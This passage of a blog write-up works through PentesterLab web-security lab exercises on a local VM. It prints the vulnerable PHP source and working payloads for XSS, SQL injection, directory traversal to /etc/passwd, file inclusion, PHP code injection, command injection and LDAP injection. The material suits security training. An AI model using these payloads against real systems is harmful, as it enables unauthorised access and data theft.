<p><img class="center" src="/images/pentest/webpentester/xss9.png" title="&lsquo;xss 9&rsquo; &lsquo;dom xss&rsquo;" ></p>

<p>Whatever we put after the pound sign gets rendered on the page. Here&rsquo;s the code that does it:</p>

<p>``` html</p>

<script>
  document.write(location.hash.substring(1));
</script>


<p>```</p>

<p>First, we have to understand the <a href="https://www.w3schools.com/jsref/jsref_substring.asp">substring</a> method:</p>

<blockquote><p> string.substring(start, end)</p>

<p>This method extracts the characters in a string between &ldquo;start&rdquo; and &ldquo;end&rdquo;, not including &ldquo;end&rdquo; itself.
Characters start at index 0</p></blockquote>

<p>And the <a href="https://www.w3schools.com/jsref/prop_loc_hash.asp">location.hash</a> returns the anchor part of the URL. So if our URL is <a href="http://192.168.217.138/xss/example9.php#moo">http://192.168.217.138/xss/example9.php#moo</a> , it will return #moo . And combined with the substring function, whatever comes after the hash is written to the page, as we saw at the beginning.</p>

<p>This page is vulnerable to DOM-based XSS, where a modification the DOM environment affects how the client code is running. Just put the payload after the hash sign, and reload the page (I had to use Chrome to see the alert):</p>

<p><code>plain
http://192.168.217.138/xss/example9.php#&lt;script&gt;alert('Bye')&lt;/script&gt;
</code></p>

<h3>SQL injections</h3>

<p><strong>Example1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/sql1.png" title="&lsquo;sqli&rsquo; &lsquo;sql injection&rsquo;" ></p>

<p>Ok, before tampering with anything, let&rsquo;s look at the source:</p>

<p>``` php
&lt;?php</p>

<p>  require_once(&lsquo;../header.php&rsquo;);
  require_once(&lsquo;db.php&rsquo;);</p>

<pre><code>$sql = "SELECT * FROM users where name='";
$sql .= $_GET["name"]."'";  
$result = mysql_query($sql);
if ($result) {
    ?&gt;
    &lt;table class='table table-striped'&gt;
  &lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;name&lt;/th&gt;&lt;th&gt;age&lt;/th&gt;&lt;/tr&gt;
    &lt;?php
    while ($row = mysql_fetch_assoc($result)) {
        echo "&lt;tr&gt;";
            echo "&lt;td&gt;".$row['id']."&lt;/td&gt;";
            echo "&lt;td&gt;".$row['name']."&lt;/td&gt;";
            echo "&lt;td&gt;".$row['age']."&lt;/td&gt;";
        echo "&lt;/tr&gt;";
    }   
    echo "&lt;/table&gt;";
}
</code></pre>

<p>  require_once &lsquo;../footer.php&rsquo;;
?>
```</p>

<p>So, the code looks in the users table for whatever we give it, and if a match is found, it displays some info. You can see there is no filtering on our input, and the DB query is <code>SELECT * FROM users where name=&lsquo;input&rsquo;</code>. This is trivial to bypass, by using <code>root' or 1=1&mdash; </code> (there is a space after &mdash;), and don&rsquo;t forget to URL encode for it to work! The query now becomes <code>SELECT * FROM users where name=&lsquo;root&rsquo; or 1=1&mdash; &lsquo;</code>, and the stray quote is commented out.</p>

<p><img class="center" src="/images/pentest/webpentester/sqlinj1.png" title="&lsquo;sqli&rsquo; &lsquo;sqli results&rsquo;" ></p>

<p><strong>Example2</strong></p>

<p>This example looks the same like the previous one, but the difference is in the code:</p>

<p>``` php
if (preg_match(&lsquo;/ /&rsquo;, $_GET[&ldquo;name&rdquo;])) {</p>

<pre><code>    die("ERROR NO SPACE");  
}
$sql = "SELECT * FROM users where name='";
$sql .= $_GET["name"]."'";

$result = mysql_query($sql);
</code></pre>

<p>```</p>

<p>Basically, the space characters are being filtered out. However, we can achieve the same results by using tabs (<code>\t</code>), which would change the previous injection to: <code>SELECT * FROM users where name=&lsquo;root&rsquo; or  1=1#</code>, where the same outcome is achieved by substituting the spaces for tabs and the comment characters from <code>&mdash; </code> to <code>#</code>. Again, don&rsquo;t forget URL encoding though!</p>

<p><strong>Example3</strong></p>

<p>Same-looking page, but slightly different code:</p>

<p>``` php
if (preg_match(&lsquo;/\s+/&rsquo;, $_GET[&ldquo;name&rdquo;])) {</p>

<pre><code>    die("ERROR NO SPACE");  
}
$sql = "SELECT * FROM users where name='";
$sql .= $_GET["name"]."'";

$result = mysql_query($sql);
</code></pre>

<p>```</p>

<p>This time, a regular expression prevents the use of any whitespace characters, including tabs, carriage returns, etc. It is possible to bypass this by using <a href="http://www.sqlinjection.net/comments/">C-style comments</a>: <code>/**/</code>. Here, our injection would be:</p>

<p><code>plain
'/**/or/**/1=1#
</code></p>

<p>And the DB query would look like this:</p>

<p><code>sql
SELECT * FROM users where name='root'/**/or/**/1=1#'
</code></p>

<p>As always, don&rsquo;t forget to URL encode when injecting!</p>

<p><strong>Example4</strong></p>

<p>Here, the URL looks just a tiny bit different: <a href="http://192.168.217.138/sqli/example4.php?id=2">http://192.168.217.138/sqli/example4.php?id=2</a></p>

<p>And the code:</p>

<p>``` php
$sql=&ldquo;SELECT * FROM users where id=&rdquo;;</p>

<pre><code>$sql.=mysql_real_escape_string($_GET["id"])." ";
$result = mysql_query($sql);
</code></pre>

<p>```</p>

<p>So, the query performed is <code>SELECT * FROM users where id=INPUT </code>, but this time, the <code>mysql_real_escape_string</code> function is used to escape the characters: <code>\x00, \n, \r, \, &lsquo;, &ldquo; and \x1a</code>. All that protection is for naught however, because the id parameter is an integer, where there is no need to use quotes. So I injected <code>2 or 1=1&mdash; </code> and again saw all results.</p>

<p><strong>Example5</strong></p>

<p>We have the same example as the previous one, but with some modifications to the underlying code:</p>

<p>``` php
if (!preg_match(&lsquo;/^[0-9]+/&rsquo;, $_GET[&ldquo;id&rdquo;])) {</p>

<pre><code>    die("ERROR INTEGER REQUIRED");  
}
$sql = "SELECT * FROM users where id=";
$sql .= $_GET["id"] ;

$result = mysql_query($sql);
</code></pre>

<p>```</p>

<p>The regular expression will make the script throw an error and stop executing if it encounters non-integer characters in the input. But the check is only made at the beginning of the input, as can be seen from the fact that there is a <code>^</code>, but not a <code>$</code> delimiter for the end. Again, the injection is trivial: <code>id=2 or 1=1&mdash; </code>.</p>

<p><strong>Example6</strong></p>

<p>The developer tried to fix the previous mistake with:</p>

<p>``` php
if (!preg_match(&lsquo;/[0-9]+$/&rsquo;, $_GET[&ldquo;id&rdquo;])) {</p>

<pre><code>    die("ERROR INTEGER REQUIRED");  
}
$sql = "SELECT * FROM users where id=";
$sql .= $_GET["id"] ;


$result = mysql_query($sql);
</code></pre>

<p>```</p>

<p>Now the code checks for the end of the string to be an integer, but not for the beginning xD Well, we can inject without worrying that we have to comment something afterwards: <code>id=2 or 1=1</code></p>

<p><strong>Example7</strong></p>

<p>Finally, the code checks for integers both at the beginning and the end:</p>

<p>``` php
if (!preg_match(&lsquo;/^&ndash;?[0-9]+$/m&rsquo;, $_GET[&ldquo;id&rdquo;])) {</p>

<pre><code>    die("ERROR INTEGER REQUIRED");  
}
$sql = "SELECT * FROM users where id=";
$sql .= $_GET["id"];

$result = mysql_query($sql);
</code></pre>

<p>```</p>

<p>There is something new in this regex: a PCRE_MULTILINE pattern modifier. Let&rsquo;s see what this does:</p>

<blockquote><p> m (PCRE_MULTILINE)</p>

<p>   By default, PCRE treats the subject string as consisting of a single &ldquo;line&rdquo; of characters
(even if it actually contains several newlines). The &ldquo;start of line&rdquo; metacharacter (^) matches
only at the start of the string, while the &ldquo;end of line&rdquo; metacharacter ($) matches only at the
end of the string, or before a terminating newline (unless D modifier is set). This is the same
as Perl. When this modifier is set, the &ldquo;start of line&rdquo; and &ldquo;end of line&rdquo; constructs match
immediately following or immediately before any newline in the subject string, respectively, as
well as at the very start and end. This is equivalent to Perl&rsquo;s /m modifier. If there are no
&ldquo;\n&rdquo; characters in a subject string, or no occurrences of ^ or $ in a pattern, setting this
modifier has no effect.</p></blockquote>

<p>So, the regex checks will be performed correctly on the first line, but we can insert new lines and inject our payload there, and no checks will be performed! With the payload <code>id=2%0A or 1=1</code>, a new line has been injected, and then the rest of the payload.</p>

<p><strong>Example8</strong></p>

<p><img class="center" src="/images/pentest/webpentester/sql8.png" title="&lsquo;sqli&rsquo; &lsquo;sqli 8&rsquo;" ></p>

<p>This example introduces the ORDER BY statement:</p>

<p><code>php
$sql = "SELECT * FROM users ORDER BY `";
$sql .= mysql_real_escape_string($_GET["order"])."`";
$result = mysql_query($sql);
</code></p>

<p>The SQL query looks like this:</p>

<p><code>sql
SELECT * FROM users ORDER BY `INPUT`;
</code></p>

<p>For this exploitation, I used <a href="http://www.securityidiots.com/Web-Pentest/SQL-Injection/group-by-and-order-by-sql-injection.html#blind">this very helpful article about time-based injection in the ORDER BY clause</a>:</p>

<p><code>plain
order=name`,(select sleep(3) from dual where database() like database())#
</code></p>

<p>First, the successful injection will be reflected by the time it takes to load the page, specified inside the <a href="https://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html#function_sleep">SLEEP</a> function. The <a href="http://www.w3resource.com/sql/sql-dual-table.php">DUAL table</a> is a special table that can be used in queries that don&rsquo;t need data from any tables. <a href="http://www.bitbybit.dk/carsten/blog/?p=201">DATABASE()</a> returns the value of the currently selected  DB, and the <a href="https://www.tutorialspoint.com/sql/sql-like-clause.htm">LIKE</a> operator is used to compare a value with another similar one. For the injection to work, don&rsquo;t forget to URL encode! Now, let&rsquo;s see how the full query would look like:</p>

<p><code>sql
SELECT * FROM users ORDER BY `name`,(select sleep(3) from dual where database() like database())#`;
</code></p>

<p>That LIKE statement is useful, because it induces a condition that is matched by the SELECT statement.</p>

<p><strong>Example9</strong></p>

<p>Source code:</p>

<p><code>php
$sql = "SELECT * FROM users ORDER BY ";
$sql .= mysql_real_escape_string($_GET["order"]);
$result = mysql_query($sql);
</code></p>

<p>No more backticks here. I used the same payload as in the previous example, but without the backticks (and URL encoded):</p>

<p><code>plain
order=(select sleep(3) from dual where database() like database())#
</code></p>

<h3>Directory traversal</h3>

<p><strong>Example1</strong></p>

<p>If you inspect the image link, you will see: <code>dirtrav/example1.php?file=hacker.png</code>. The source code for this challenge is:</p>

<p>``` php
&lt;?php</p>

<p>$UploadDir = &lsquo;/var/www/files/&rsquo;;</p>

<p>if (!(isset($_GET[&lsquo;file&rsquo;])))</p>

<pre><code>die();
</code></pre>

<p>$file = $_GET[&lsquo;file&rsquo;];</p>

<p>$path = $UploadDir . $file;</p>

<p>if (!is_file($path))</p>

<pre><code>die();
</code></pre>

<p>header(&lsquo;Cache-Control: must-revalidate, post-check=0, pre-check=0&rsquo;);
header(&lsquo;Cache-Control: public&rsquo;);
header(&lsquo;Content-Disposition: inline; filename=&ldquo;&rsquo; . basename($path) . &lsquo;&rdquo;;&rsquo;);
header(&lsquo;Content-Transfer-Encoding: binary&rsquo;);
header(&lsquo;Content-Length: &rsquo; . filesize($path));</p>

<p>$handle = fopen($path, &lsquo;rb&rsquo;);</p>

<p>do {
$data = fread($handle, 8192);
if (strlen($data) == 0) {
break;
}
echo($data);
} while (true);</p>

<p>fclose($handle);
exit();</p>

<p>?>
```</p>

<p>There is no filtering involved, so I displayed the <em>/etc/passwd</em> file with: <a href="http://192.168.217.138/dirtrav/example1.php?file=../../../../../etc/passwd">http://192.168.217.138/dirtrav/example1.php?file=../../../../../etc/passwd</a></p>

<p><img class="center" src="/images/pentest/webpentester/passwd.png" title="&lsquo;passwd file&rsquo; &lsquo;passd file&rsquo;" ></p>

<p><strong>Example2</strong></p>

<p>The path for this one is <code>dirtrav/example2.php?file=/var/www/files/hacker.png</code>. In the code, we are only interested in the parts that manipulate the file to be included:</p>

<p>``` php
$file = $_GET[&lsquo;file&rsquo;];</p>

<p>if (!(strstr($file,&ldquo;/var/www/files/&rdquo;)))</p>

<pre><code>die();
</code></pre>

<p>```</p>

<p>The script tries to enforce the location of the file to be in /var/www/files, but we can leave it as it is and just go up a few directories and include the passwd file again: <code>file=/var/www/files/../../../etc/passwd</code>.</p>

<p><strong>Example 3</strong></p>

<p>Here is the path: <code>dirtrav/example3.php?file=hacker</code></p>

<p>And the code:</p>

<p>``` php
$UploadDir = &lsquo;/var/www/files/&rsquo;;</p>

<p>if (!(isset($_GET[&lsquo;file&rsquo;])))</p>

<pre><code>die();
</code></pre>

<p>$file = $_GET[&lsquo;file&rsquo;];</p>

<p>$path = $UploadDir . $file.&ldquo;.png&rdquo;;
// Simulate null-byte issue that used to be in filesystem related functions in PHP
$path = preg_replace(&lsquo;/\x00.*/&rsquo;,&ldquo;&rdquo;,$path);</p>

<p>if (!is_file($path))</p>

<pre><code>die();
</code></pre>

<p>```</p>

<p>The code gives the hint of exploiting this: the null byte, which will make the system ignore anything that comes after it. So the extension check will be bypassed: <code>file=../../../../../etc/passwd%00</code></p>

<h3>File Include</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/fileinc.png" title="&lsquo;file includes&rsquo; &lsquo;file inclusion&rsquo;" ></p>

<p>Let&rsquo;s see the code:</p>

<p>``` php
&lt;?php</p>

<pre><code>if ($_GET["page"]) {
    include($_GET["page"]);

} 
</code></pre>

<p>?>
```</p>

<p>There is no validation performed on the file to be included. For this challenge, PentesterLab provides a sample include file that calls phpinfo() at <a href="http://assets.pentesterlab.com/test_include.txt">http://assets.pentesterlab.com/test_include.txt</a></p>

<p>Just include the above file to see the output of phpinfo(): <code>page=<a href="http://assets.pentesterlab.com/test_include.txt">http://assets.pentesterlab.com/test_include.txt</a></code></p>

<p><img class="center" src="/images/pentest/webpentester/phpinfo.png" title="&lsquo;phpinfo&rsquo; &lsquo;phpinfo output&rsquo;" ></p>

<p><strong>Example2</strong></p>

<p>The URL is slightly different now: <a href="http://192.168.217.138/fileincl/example2.php?page=intro">http://192.168.217.138/fileincl/example2.php?page=intro</a></p>

<p>And the code:</p>

<p>``` php
&lt;?php</p>

<pre><code>if ($_GET["page"]) {
$file = $_GET["page"].".php";
// simulate null byte issue
$file = preg_replace('/\x00.*/',"",$file);
    include($file);
} 
</code></pre>

<p>?>
```</p>

<p>So the code automatically appends a PHP extension to the file, but is also vulnerable to null bytes. I included the same file as in the previous example, with a <code>%00</code> at the end: <code>page=<a href="http://assets.pentesterlab.com/test_include.txt%00">http://assets.pentesterlab.com/test_include.txt%00</a></code></p>

<h3>Code injection</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/code1.png" title="&lsquo;code injection&rsquo; &lsquo;code injection 1&rsquo;" ></p>

<p>Source code:</p>

<p>``` php
&lt;?php
  $str=&ldquo;echo \"Hello &rdquo;.$_GET[&lsquo;name&rsquo;].&ldquo;!!!\&rdquo;;&ldquo;;</p>

<p>  eval($str);
?>
```</p>

<p>The string <code>echo &ldquo;Hello hacker!!!&rdquo;;</code> is passed to eval. Whatever else we input after the name variable comes right after hacker and before the exclamation signs: Hello hacker@!!! (with an example of adding @ after hacker). However, if we input a double-quote, we get an error:</p>

<p><code>plain
Parse error: syntax error, unexpected '!', expecting ',' or ';' in /var/www/codeexec/example1.php(6) : eval()'d code on line 1
</code></p>

<p>That is because eval now has to evaluate the broken syntax of <code>echo &ldquo;Hello hacker&rdquo;!!!&ldquo;;</code>. We can take advantage of this by appending a command and then commenting out the remaining <code>!!!&rdquo;;</code>:</p>

<p><code>plain
name=hacker" . system('hostname');//
</code></p>

<p>URL encode it and you will see the output:</p>

<p><img class="center" src="/images/pentest/webpentester/codeinj1.png" title="&lsquo;code injection&rsquo; &lsquo;code injection 1 success&rsquo;" ></p>

<p>This worked because what eval saw was: <code>echo &ldquo;Hello hacker&rdquo; . system(&lsquo;hostname&rsquo;);//!!!&ldquo;;</code></p>

<p><strong>Example 2</strong></p>

<p><img class="center" src="/images/pentest/webpentester/code2.png" title="&lsquo;code injection&rsquo; &lsquo;code injection 2&rsquo;" ></p>

<p>PHP code:</p>

<p>``` php
&lt;?php
class User{
  public $id, $name, $age;
  function __construct($id, $name, $age){</p>

<pre><code>$this-&gt;name= $name;
$this-&gt;age = $age;
$this-&gt;id = $id;
</code></pre>

<p>  } <br/>
}
  require_once(&lsquo;../header.php&rsquo;);
  require_once(&lsquo;../sqli/db.php&rsquo;);</p>

<pre><code>$sql = "SELECT * FROM users ";

$order = $_GET["order"];
$result = mysql_query($sql);
</code></pre>

<p>  if ($result) {</p>

<pre><code>    while ($row = mysql_fetch_assoc($result)) {
  $users[] = new User($row['id'],$row['name'],$row['age']);
}
if (isset($order)) { 
  usort($users, create_function('$a, $b', 'return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');'));
}
}   

    ?&gt;
</code></pre>

<table class='table table-striped' >
        <tr>
            <th><a href="example2.php?order=id">id</th>
            <th><a href="example2.php?order=name">name</th>
            <th><a href="example2.php?order=age">age</th>
        </tr>
        <?php

    foreach ($users as $user) {  
            echo "<tr>";
                echo "<td>".$user->id."</td>";
                echo "<td>".$user->name."</td>";
                echo "<td>".$user->age."</td>";
            echo "</tr>";
        }   
        echo "</table>


<p>  require &lsquo;../footer.php&rsquo;;
?>
```</p>

<p>The line to focus on is:</p>

<p><code>php
usort($users, create_function('$a, $b', 'return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');'));
</code></p>

<p>Here, the <a href="https://www.pentesterlab.com/exercises/web_for_pentester/course">PentesterLab course</a> explains the vulnerability exists in the <a href="https://secure.php.net/manual/en/function.usort.php">usort(array, user-defined function)</a> function, because it uses <a href="https://secure.php.net/manual/en/function.create-function.php">create_function(args, code)</a>, which is used to create an anonymous (lambda-style) function. <strong>create_function</strong> is vulnerable to unfiltered input because it uses eval() at its core. There is a known <a href="http://www.exploitalert.com/view-details.html?id=10264">exploit</a> that allows code injection and executing the code without creating and calling the function. Let&rsquo;s see how this works:</p>

<p><strong>create_function</strong> is a ZEND_FUNCTION defined in <em>zend_builtin_functions.c</em>. Here is part of the vulnerable code:</p>

<p><img class="center" src="/images/pentest/webpentester/ffs.png" title="&lsquo;c code&rsquo; &lsquo;vulnerable code&rsquo;" ></p>

<p>The folks at PentesterLab were nice enough to help me understand this, I was in one of those states where you don&rsquo;t see the forest from the trees! Basically, the code for the lambda function is the string inside curly brackets, and there is no filtering for {}. So later, this same user-supplied string gets evaluated by zend_eval_string. We can inject code in the $order parameter, so our code gets in this line:</p>

<p><code>php
usort($users, create_function('$a, $b', 'return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');'));
</code></p>

<p>And that line will be used in the format string. The payload I used is : <code>order=id);}echo &lsquo;INJECTION SUCCESSFUL&rsquo;;//</code>. Now, inside eval(), the lambda function without injection looks something like this:</p>

<p><code>plain
function LAMBDA_TEMP_FUNCNAME (a,b){return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');}
</code></p>

<p>Let&rsquo;s deconstruct it step by step. Adding <strong>);</strong> closes the call to strcmp, but leaves garbage behind and also an unclosed {} , because the end curly bracket is now part of the discarded code:</p>

<p><code>plain
function LAMBDA_TEMP_FUNCNAME (a,b){return strcmp($a-&gt;'.$order.');,$b-&gt;'.$order.');}
</code></p>

<p>Adding a closing curly bracket correctly closes the format string, so now we have:</p>

<p><code>plain
function LAMBDA_TEMP_FUNCNAME (a,b){return strcmp($a-&gt;'.$order.');},$b-&gt;'.$order.');}
</code></p>

<p>To test where I was with the injection, I left it at that and got this error:</p>

<p><code>plain
Parse error: syntax error, unexpected ',' in /var/www/codeexec/example2.php(22) : runtime-created function on line 1 Warning: usort() expects parameter 2 to be a valid callback, no array or string given in /var/www/codeexec/example2.php on line 22
</code></p>

<p>So the code picks up after the curly bracket, we know we have to comment out the rest. And between the curly bracket and the comment characters we can put our code:</p>

<p><code>plain
function LAMBDA_TEMP_FUNCNAME (a,b){return strcmp($a-&gt;'.$order.');}echo 'INJECTION SUCCESSFUL';//,$b-&gt;'.$order.');}
</code></p>

<p>And the result:</p>

<p><img class="center" src="/images/pentest/webpentester/codeinj2.png" title="&lsquo;code injection 2&rsquo; &lsquo;code injection&rsquo;" ></p>

<p>eval() now sees a strcmp, which is executed (but only with 1 parameter, hence the warning). Then eval goes further, sees our code and executes it (the warning doesn&rsquo;t stop the execution). And finally, eval reaches the leftovers, which have been commented out, so it does nothing.</p>

<p>This here was my favorite part in all the challenge!</p>

<p><strong>Example 3</strong></p>

<p>Here we have the familiar hello hacker message, but with a twist on the URL: <a href="http://192.168.217.138/codeexec/example3.php?new=hacker&amp;pattern=/lamer/&amp;base=Hello%20lamer">http://192.168.217.138/codeexec/example3.php?new=hacker&amp;pattern=/lamer/&amp;base=Hello%20lamer</a></p>

<p>Let&rsquo;s see the code:</p>

<p>``` php
&lt;?php</p>

<pre><code>echo preg_replace($_GET["pattern"], $_GET["new"], $_GET["base"]);
</code></pre>

<p>?>
```</p>

<p>Ok, preg_replace searches inside the base parameter (Hello lamer) for matches to the pattern parameter (hacker) and replaces them with what&rsquo;s in the new parameter (hacker).</p>

<p>The problem with preg_replace is that it can be passed the modifier <a href="https://secure.php.net/manual/en/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers.eval">e (PREG_REPLACE_EVAL)</a> that causes PHP to <a href="https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace">execute the replacement value</a>.</p>

<p>To exploit this, first we have to add the modifier to the pattern: <code>pattern=/lamer/e</code>. Then we put our code inside the new parameter: <code>new=phpinfo()</code>. The URL now looks like this: <a href="http://192.168.217.138/codeexec/example3.php?new=phpinfo%28%29&amp;pattern=/lamer/e&amp;base=Hello%20lamer">http://192.168.217.138/codeexec/example3.php?new=phpinfo%28%29&amp;pattern=/lamer/e&amp;base=Hello%20lamer</a></p>

<p><img class="center" src="/images/pentest/webpentester/phpinfo.png" title="&lsquo;phpinfo&rsquo; &lsquo;phpinfo output&rsquo;" ></p>

<p><strong>Example 4</strong></p>

<p>This one looks like the first example, but with a new addition in the code:</p>

<p><code>php
// ensure name is not empty
assert(trim("'".$_GET['name']."'"));
echo "Hello ".htmlentities($_GET['name']);
</code></p>

<p><a href="https://secure.php.net/manual/ro/function.assert.php">assert</a> checks if the assertions is false, but the most important thing that we need to know is: <strong>if the assertion is given as a string it will be evaluated as PHP code by assert()</strong>.</p>

<p>The assert returns true, because it checks that the name parameter = &lsquo;hacker&rsquo;, which it is. When injecting a single quote, we see this error:</p>

<p><code>plain
Parse error: syntax error, unexpected T_ENCAPSED_AND_WHITESPACE in /var/www/codeexec/example4.php(4) : assert code on line 1 Catchable fatal error: assert(): Failure evaluating code: 'hacker'' in /var/www/codeexec/example4.php on line 4
</code></p>

<p>I used a PHP sandbox to help me with this. Let&rsquo;s imagine that the name parameter is a simple string with the value of hacker:</p>

<p><code>php
$name = 'hacker';
</code></p>

<p>Thanks to the use of trim, assert will see (and try to evaluate) the value of &lsquo;hacker&rsquo;. Knowing this, if I try injecting <code>hacker'.phpinfo().&lsquo;</code>, inside the code I assume it will look like this:</p>

<p><code>php
$name = 'hacker'.phpinfo().'';
</code></p>

<p>With the string concatenation, phpinfo() is displayed, but we also see at the bottom of the page: <code>Hello hacker'.phpinfo().&lsquo;</code>. The assert was successful, and the code was executed.</p>

<h3>Commands injection</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/cmd1.png" title="&lsquo;cmd injection&rsquo; &lsquo;ping&rsquo;" ></p>

<p>It looks like a ping program:</p>

<p><code>php
&lt;?php
  system("ping -c 2 ".$_GET['ip']);
?&gt;
</code></p>

<p>You can chain another command after the ping one by doing this: <code>ip=127.0.0.1;whoami</code>. Below the ping output, you can now see the whoami output, which in this case is www-data</p>

<p><strong>Example 2</strong></p>

<p>This looks the same like the previous one, but let&rsquo;s see the code:</p>

<p>``` php
&lt;?php
  if (!(preg_match(&lsquo;/^\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}$/m&rsquo;, $_GET[&lsquo;ip&rsquo;]))) {</p>

<pre><code> die("Invalid IP address");
</code></pre>

<p>  }
  system(&ldquo;ping -c 2 &rdquo;.$_GET[&lsquo;ip&rsquo;]);
?>
```</p>

<p>There is some regex added now to validate that the ip parameter will indeed look like in IP. However, similar to a previous example, the check won&rsquo;t look on further lines. We can use <code>%0a</code> to introduce a new line, and run our command there: <code>ip=127.0.0.1%0Apwd</code>. And the output is:</p>

<p>``` plain
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.012 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.022 ms</p>

<p>&mdash;&ndash; 127.0.0.1 ping statistics &mdash;&ndash;
2 packets transmitted, 2 received, 0% packet loss, time 999ms
rtt min/avg/max/mdev = 0.012/0.017/0.022/0.005 ms
/var/www/commandexec
```</p>

<p><strong>Example 3</strong></p>

<p>Same-looking URL, and slightly different code:</p>

<p>``` php
&lt;?php
  if (!(preg_match(&lsquo;/^\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}$/&rsquo;, $_GET[&lsquo;ip&rsquo;]))) {</p>

<pre><code> header("Location: example3.php?ip=127.0.0.1");
</code></pre>

<p>  }
  system(&ldquo;ping -c 2 &rdquo;.$_GET[&lsquo;ip&rsquo;]);
?>
```</p>

<p>This time, the script will redirect the user if the ip parameter doesn&rsquo;t match the regex. However, the execution will continue, even if the browser gets redirected. To stop the execution altogether, it would be necessary to call the <em>die()</em> function after the <em>header()</em> function, which isn&rsquo;t happening in this case. So we can still inject a command, but we&rsquo;ll need to do it through another medium than the browser, or use a proxy. For this, I used Burp, sent the payload <code>ip=127.0.0.1;ls</code>, and looked inside the 302 response to find what I wanted to see:</p>

<p><code>plain
example1.php
example2.php
example3.php
index.html
</code></p>

<h3>LDAP attacks</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/ldap1.png" title="&lsquo;ldap&rsquo; &lsquo;ldap 1&rsquo;" ></p>

<p>This is a new type of exercise, involving LDAP:</p>

<p>``` php
&lt;?php
  require &ldquo;../header.php&rdquo; ;
  $ld = ldap_connect(&ldquo;localhost&rdquo;) or die(&ldquo;Could not connect to LDAP server&rdquo;);
  ldap_set_option($ld, LDAP_OPT_PROTOCOL_VERSION, 3);
  ldap_set_option($ld, LDAP_OPT_REFERRALS, 0);
  if ($ld) {
   if (isset($_GET[&ldquo;username&rdquo;])) {</p>

<pre><code> $user = "uid=".$_GET["username"]."ou=people,dc=pentesterlab,dc=com";
</code></pre>

<p>   }
   $lb = @ldap_bind($ld, $user,$_GET[&ldquo;password&rdquo;]);</p>

<pre><code>if ($lb) {
   echo "AUTHENTICATED";
}
else {
   echo "NOT AUTHENTICATED";
}
</code></pre>

<p>  }
  require &ldquo;../footer.php&rdquo; ;
?>
```</p>

<p>First, let&rsquo;s learn more about <a href="http://projects.webappsec.org/w/page/13246947/LDAP%20Injection">LDAP</a>:</p>

<blockquote><p>LDAP Injection is an attack technique used to exploit web sites that construct LDAP statements from user-
supplied input.</p>

<p>Lightweight Directory Access Protocol (LDAP) is an open-standard protocol for both querying and
manipulating X.500 directory services. The LDAP protocol runs over Internet transport protocols, such as
TCP. Web applications may use user-supplied input to create custom LDAP statements for dynamic web page
requests.</p>

<p>When a web application fails to properly sanitize user-supplied input, it is possible for an attacker to
alter the construction of an LDAP statement. When an attacker is able to modify an LDAP statement, the
process will run with the same permissions as the component that executed the command. (e.g. Database
server, Web application server, Web server, etc.). This can cause serious security problems where the
permissions grant the rights to query, modify or remove anything inside the LDAP tree. The same advanced
exploitation techniques available in SQL Injection can also be similarly applied in LDAP Injection.</p></blockquote>

<p>This particular example is vulnerable to <a href="https://securitysynapse.blogspot.com/2013/09/dangers-of-ldap-null-base-and-bind.html">NULL bind</a>, where an anonymous user can access information from the LDAP directory without authentication. For this, the values sent to the server have to be null, so instead of just sending empty values, we have to completely remove them:</p>

<p><img class="center" src="/images/pentest/webpentester/ldap1_sol.png" title="&lsquo;ldap 1&rsquo; &lsquo;ldap null&rsquo;" ></p>

<p><strong>Example 2</strong></p>

<p><img class="center" src="/images/pentest/webpentester/ldap2.png" title="&lsquo;ldap&rsquo; &lsquo;ldap 2&rsquo;" ></p>

<p>Let&rsquo;s see the code:</p>

<p>``` php
&lt;?php
  require &ldquo;../header.php&rdquo; ;
  $ld = ldap_connect(&ldquo;localhost&rdquo;) or die(&ldquo;Could not connect to LDAP server&rdquo;);
  ldap_set_option($ld, LDAP_OPT_PROTOCOL_VERSION, 3);
  ldap_set_option($ld, LDAP_OPT_REFERRALS, 0);
  if ($ld) {
   $lb = @ldap_bind($ld, &ldquo;cn=admin,dc=pentesterlab,dc=com&rdquo;, &ldquo;pentesterlab&rdquo;);</p>

<pre><code>if ($lb) {
  $pass = "{MD5}".base64_encode(pack("H*",md5($_GET['password'])));
  $filter = "(&amp;(cn=".$_GET['name'].")(userPassword=".$pass."))";
  if (!($search=@ldap_search($ld, "ou=people,dc=pentesterlab,dc=com", $filter))) {
  echo("Unable to search ldap server&lt;br&gt;");
  echo("msg:'".ldap_error($ld)."'&lt;/br&gt;");
} else {
  $number_returned = ldap_count_entries($ld,$search);
  $info = ldap_get_entries($ld, $search);
  if ($info["count"] &lt; 1) {
     //NOK 
     echo "UNAUTHENTICATED";
  }
  else {
    echo "AUTHENTICATED as";
    echo(" ".htmlentities($info[0]['uid'][0]));
  } 
}
</code></pre>

<p>   }
  }
  require &ldquo;../footer.php&rdquo; ;
?>
```</p>

<p>The goal here is to be able to authenticate with any password, and get information from the directory. Now, since the password is being hashed, the only likely place to inject into is the username. To learn more about LDAP, its rules and types of injection, I found a nice <a href="https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf">BlackHat whitepaper</a>. The key takeaway is that the injection will happen in the filter. In our case, the filter is:</p>

<p><code>plain
(&amp;(cn=name)(userPassword=password))
</code></p>

<p>We see here that filter uses <strong>&amp;</strong>, which specifies an AND condition, where both username and password have to be true. Remembering that we can only inject inside the username parameter, here&rsquo;s what we can do:</p>

<p><code>plain
(&amp;(cn=name)(cn=*))%00(userPassword=password))
</code></p>

